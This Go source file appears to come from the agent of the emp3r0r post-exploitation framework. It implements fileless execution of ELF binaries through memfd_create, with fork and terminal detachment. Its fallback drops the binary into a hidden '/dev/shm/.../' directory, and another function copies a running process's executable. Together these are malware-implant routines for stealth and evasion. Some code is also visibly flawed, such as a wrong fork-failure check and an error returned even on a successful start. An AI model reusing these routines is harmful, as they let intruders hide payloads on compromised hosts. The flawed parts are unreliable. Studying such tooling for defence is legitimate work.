//go:build linux
// +build linux

package agent

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ProcUID get euid of a process
func ProcUID(pid int) string {
	f, err := os.Open(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return ""
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "Uid:") {
			uid := strings.Fields(line)[1]
			return uid
		}
	}
	return ""
}

// run ELF from memory
func RunFromMemory(procName, args string, buffer []byte) (err error) {
	const (
		mfdCloexec     = 0x0001
		memfdCreateX64 = 319
		fork           = 57
	)
	fdName := "" // *string cannot be initialized

	fd, _, _ := syscall.Syscall(memfdCreateX64, uintptr(unsafe.Pointer(&fdName)), uintptr(mfdCloexec), 0)
	_, err = syscall.Write(int(fd), buffer)
	if err != nil {
		return fmt.Errorf("write: %v", err)
	}

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)

	child, _, _ := syscall.Syscall(fork, 0, 0, 0)
	switch child {
	case 0:
		break
	case 1:
		// Fork failed!
		return fmt.Errorf("fork failed")
	default:
		// Parent exiting...
		log.Println("Exiting")
		os.Exit(0)
	}

	_ = syscall.Umask(0)
	_, _ = syscall.Setsid()
	_ = syscall.Chdir("/")

	file, err := os.OpenFile("/dev/null", os.O_RDWR, 0)
	if err != nil {
		return fmt.Errorf("open /dev/null: %v", err)
	}
	err = syscall.Dup2(int(file.Fd()), int(os.Stdin.Fd()))
	if err != nil {
		return fmt.Errorf("Dup2: %v", err)
	}
	file.Close()

	progWithArgs := append([]string{procName}, os.Args[1:]...)
	log.Printf("Starting memfd executable as %s", procName)
	err = syscall.Exec(fdPath, progWithArgs, nil)
	if err == nil {
		log.Printf("%s started from memory using memfd_create", procName)
		return
	}

	// older kernel
	log.Printf("memfd_create failed: %v, trying shm_open", err)
	shmPath := "/dev/shm/.../"
	if _, err = os.Stat(shmPath); os.IsNotExist(err) {
		log.Printf("shmPath does not exist, creating it")
		err = os.Mkdir(shmPath, 0700)
		if err != nil {
			return fmt.Errorf("mkdir shmPath: %v", err)
		}
	}
	err = ioutil.WriteFile(shmPath+procName, buffer, 0755)
	if err != nil {
		return fmt.Errorf("WriteFile to shmPath: %v", err)
	}
	err = os.Chdir(shmPath)
	if err != nil {
		return fmt.Errorf("cd to shmPath: %v", err)
	}
	cmd := exec.Command(procName, strings.Fields(args)...)
	cmd.Env = os.Environ()

	log.Printf("Starting shm executable %s", shmPath+procName)
	return fmt.Errorf("Start shm executable: %v", cmd.Start())
}

// CopyProcExeTo copy executable of an process to dest_path
func CopyProcExeTo(pid int, dest_path string) (err error) {
	elf_data, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/exe", pid))
	if err != nil {
		return fmt.Errorf("Read %d exe: %v", pid, err)
	}

	// overwrite
	if util.IsFileExist(dest_path) {
		os.RemoveAll(dest_path)
	}

	return ioutil.WriteFile(dest_path, elf_data, 0755)
}
